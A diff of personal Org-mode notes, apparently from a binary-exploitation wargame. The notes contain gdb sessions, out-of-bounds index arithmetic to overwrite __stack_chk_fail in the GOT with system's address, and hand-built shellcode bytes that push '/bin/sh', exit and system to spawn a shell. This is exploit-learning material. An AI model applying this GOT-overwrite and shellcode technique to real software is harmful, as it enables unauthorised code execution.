@@ -624,130 +624,179 @@ Look like just don't leave write in index  % 3 == 0
 ******* Let's try to overwrite __stack_chk_fail@got.plt
 
 #+begin_src shell
-            Input command: store
-             Number: 4159090384
-             Index: -33632615
-
-            Program received signal SIGSEGV, Segmentation fault.
-            # May overflow first the reg and add the positive index.
-          p/d 0xffffffff - $eax
-          $27 = 9611
-          # + 1 for leave the register to 0x0
-        p/d (0xffffffff - $eax) + 1
-        $28 = 9612
-
-            p/d ((0xffffffff - $eax) + 1)/4
-          $29 = 2403
-
-      p (int)0x804A010
-      $19 = 134520848
-    p (int)0x804A010/4
-    33630212
-    # add the other operand.
+  Input command: store
+  Number: 4159090384
+  Index: -33632615
+  Program received signal SIGSEGV, Segmentation fault.
+  # May overflow first the reg and add the positive index.
+  p/d 0xffffffff - $eax
+  $27 = 9611
+  # + 1 for leave the register to 0x0
+  p/d (0xffffffff - $eax) + 1
+  $28 = 9612
+  p/d ((0xffffffff - $eax) + 1)/4
+  $29 = 2403
+  p (int)0x804A010
+  $19 = 134520848
+  p (int)0x804A010/4
+  33630212
+  # add the other operand.
   p 2403+ 33630212
   $35 = 33632615
-    the reverse of  esp - got.plt.
+  the reverse of  esp - got.plt.
+  Input command: store
+  Number: 4159090384 // system va
+  Index: 33632615
+  (gdb) x/a 0x804A010
+  0x804a010 <__stack_chk_fail@got.plt>:	0xf7e6aed0
+  # Two ways
+  (gdb) info symbol 0xf7e6aed0
+  system in section .text of /lib32/libc.so.6
+  int_arr = esp + 0x24  -> 36B
+  # modify stack to got exit_va, /bin/sh
+  Not possible may use a ret to go to system to "/bin/sh" 
+  system=0xf7e6aed0
+  exit=0xf7e5eb70// Couldn't modified this one
+  "/bin/sh"_va=0xf7f897ec	 
 
-    Input command: store
- Number: 4159090384 // system va
- Index: 33632615
-(gdb) x/a 0x804A010
-0x804a010 <__stack_chk_fail@got.plt>:	0xf7e6aed0
-(gdb) info symbol 0xf7e6aed0
-system in section .text of /lib32/libc.so.6
+          system_va=4159090384
+          system_ret_va=4159040368(exit_va)
+          system_param_va||"/bin/sh"_va=4160264172
+              payload
+              system_write_got=print "store"; print "4159090384"; print "33632615";
+
+
+    ##
+    fin
+  Run till exit from #0  0x08048636 in store_number ()
+   Number: 4160264172
+   Index: -8
+  0x080488ef in main ()
+  (gdb) x/2a $esp
+  0xffffda50:	0xffffda74	0xf7f897ec
+  (gdb) x/2s $esp
+  0xffffda50:	 "t\332\377\377\354\227\370\367\300\372\374\367\024\307\375", <incomplete sequence \367\230>
+  0xffffda62:	 ""
+  (gdb) x/s 0xf7f897ec
+  0xf7f897ec:	 "/bin/sh"
+  store
+    Breakpoint 1, 0x08048636 in store_number ()
+    (gdb) fin
+    Run till exit from #0  0x08048636 in store_number ()
+     Number: 4159040368 
+    4159040368
+     Index: 4294967287
+
+    #little payload in s push /bin/sh_va, exit_va, system_va, ret
+     "\x68\xEC\x97\xF8\xF7\x68\x70\xEB\xE5\xF7\x68\xD0\xAE\xE6\xF7\xC3"
+
+        Array Literal:
+
+        { 0x68, 0xEC, 0x97, 0xF8, 0xF7, 0x68, 0x70, 0xEB, 0xE5, 0xF7, 0x68, 0xD0, 0xAE, 0xE6, 0xF7, 0xC3 }
+        Disassembly:
+
+        0:  68 ec 97 f8 f7          push   0xf7f897ec;/bin/sh_va
+        5:  68 70 eb e5 f7          push   0xf7e5eb70;exit_va
+        a:  68 d0 ae e6 f7          push   0xf7e6aed0;system_va
+        f:  c3                      ret; jmp system_va
+              fgets(Input command: a
+              "a\n", 20, 0xf7fcfac0)                          = 0xffffdc28
+
+
+      save it in s + 4 -> 
+      s = 0xffffdc28
+      quit_len=4
+      s + 4 = 0xffffdc2c 
+
 #+end_src
 #+begin_quote
 Need to pass /bin/sh to parameter to system
 #+end_quote
-******** CANC Let's try to pass /bin/sh to system.
+******** DONE Let's try to pass /bin/sh to system.
 CLOSED: [2025-12-12 Fri 07:15]
 :LOGBOOK:
 - State "CANC"       from              [2025-12-12 Fri 07:15] \\
 i could by pass with @hakamed solution.
 :END:
 #+begin_src shell
-        esp + 8 param - 0x24 (arr_int)
-        p 0x8-0x24
-        $40 = -28
-        (gdb) p (0x8-0x24)/4
-        $41 = -7
-      -7 % 3 != 0
-    p 0xf7f897ec
-    $36 = 4160264172
-    (gdb) x/s 0xf7f897ec
-    0xf7f897ec:	 "/bin/sh"
+  esp + 8 param - 0x24 (arr_int)
+  p 0x8-0x24
+  $40 = -28
+  (gdb) p (0x8-0x24)/4
+  $41 = -7
+  -7 % 3 != 0
+  p 0xf7f897ec
+  $36 = 4160264172
+  (gdb) x/s 0xf7f897ec
+  0xf7f897ec:	 "/bin/sh"
   Input command: store
-   Number: 4160264172
-   Index: -7
-   ,*** ERROR! ***
-     This index is reserved for wil!
-   ,*** ERROR! ***
-   Failed to do store command
-   # Then -7 doesn't like the overflow
+  Number: 4160264172
+  Index: -7
+  ,*** ERROR! ***
+  This index is reserved for wil!
+  ,*** ERROR! ***
+  Failed to do store command
   Input command: store
-   Number: 4160264172
-   Index: -8
-   Completed store command successfully
-   #
-   p (unsigned int) -7
-$46 = 4294967289
-set $a=4294967289
-(gdb) p   $a == 3 * ($a/3)
-$47 = 1
+  Number: 4160264172
+  Index: -8
+  Completed store command successfully
+  #
+  p (unsigned int) -7
+  $46 = 4294967289
+  set $a=4294967289
+  (gdb) p   $a == 3 * ($a/3)
+  $47 = 1
 #+end_src
 ******** May put little shellcode on s for launch
 #+begin_src shell
-                  arr_int [esp+0x24] -> 0xffffda74
-                  s = [ebp-24h]
-                   p $ebp - 0x24
-                  $48 = (void *) 0xffffdc14// This is gdb outside use ltrace.
-              p 0xffffdc14
-              $49 = 4294958100 + 4 of quit
-            p 0xffffdc14+4
-            $52 = 4294958104
+  arr_int [esp+0x24] -> 0xffffda74
+  s = [ebp-24h]
+  p $ebp - 0x24
+  $48 = (void *) 0xffffdc14// This is gdb outside use ltrace.
+  p 0xffffdc14
+  $49 = 4294958100 + 4 of quit
+  p 0xffffdc14+4
+  $52 = 4294958104
+  push "/bin/sh"_va //5B
+  push 0x1// 2B
+  push system_va // 5B
+  ret // 1B
+  "quit".len() + 14B -> 4 + 14 B = 18B
+  may use 4 B for "quit"
+  p (char[5])"quit"
+  $50 = "quit"
+  (gdb) p (char[4])"quit"
+  Too many array elements
+  (gdb) p (char[6])"quit"
+  $51 = "quit\000"
 
+  Input command: store
+  Number: 4294958104
+  Index: 33632615
+  Completed store command successfully
 
+  x/a 0x804A010
+  0x804a010 <__stack_chk_fail@got.plt>:	0xffffdc18
 
-                    push "/bin/sh"_va //5B
-                    push 0x1// 2B
-                    push system_va // 5B
-                    ret // 1B
-                    "quit".len() + 14B -> 4 + 14 B = 18B
-                    may use 4 B for "quit"
-              p (char[5])"quit"
-              $50 = "quit"
-              (gdb) p (char[4])"quit"
-              Too many array elements
-              (gdb) p (char[6])"quit"
-              $51 = "quit\000"
+  p/x 0xffffdc14+4
+  $53 = 0xffffdc18
 
-          Input command: store
-           Number: 4294958104
-           Index: 33632615
-           Completed store command successfully
-
-              x/a 0x804A010
-          0x804a010 <__stack_chk_fail@got.plt>:	0xffffdc18
-
-          p/x 0xffffdc14+4
-        $53 = 0xffffdc18
-
-      Input command: store
-       Number: 0
-       Index: -9
-       Completed store command successfully
-      p 0x24 - (8*4)
-      $54 = 4
-    Input command: store
-     Number: 0
-     Index: -9
-     Completed store command successfully
-     i could write in -8 and -9
-     p 0x24 - (9*4)
+  Input command: store
+  Number: 0
+  Index: -9
+  Completed store command successfully
+  p 0x24 - (8*4)
+  $54 = 4
+  Input command: store
+  Number: 0
+  Index: -9
+  Completed store command successfully
+  i could write in -8 and -9
+  p 0x24 - (9*4)
   $56 = 0
   (gdb) p 0x24 - (8*4)
   $57 = 4
-      may i put a payload that is push system_va ret
+  may i put a payload that is push system_va ret
 #+end_src
 #+begin_quote
 Step 1 Overwrite canary. Step 1 and 2 are swappable.
@@ -814,7 +863,21 @@ CLOSED: [2025-12-11 Thu 15:10]
   #f7fda000-f7fdb000
   #f7ffd000-f7ffe000
 #+end_quote
-
+*** Options
+#+begin_quote
+return main system  exit  /bin/sh
+return main| got __fail_stack payload in s loaded  on quit command push /bin/sh+push 0x1+push exit_va+ ret
+~ 0:  68 ec 97 f8 f7          push   0xf7f897ec
+5:  68 70 eb e5 f7          push   0xf7e5eb70
+a:  68 d0 ae e6 f7          push   0xf7e6aed0
+f:  c3                      ret ~ 16+1B is to long because that
+~"\x68\xEC\x97\xF8\xF7\x6A\x01\x68\xD0\xAE\xE6\xF7\xC3"~
+Disassembly:
+0:  68 ec 97 f8 f7          push   0xf7f897ec
+5:  6a 01                   push   0x1; // whatever 
+7:  68 d0 ae e6 f7          push   0xf7e6aed0
+return main| got  __fail_stack payload added  need to  convert payload to int and fix invalid indexes this way (0x80000000 + index).  
+#+end_quote
 * Explotation
 #+begin_src shell
       # index modify return main
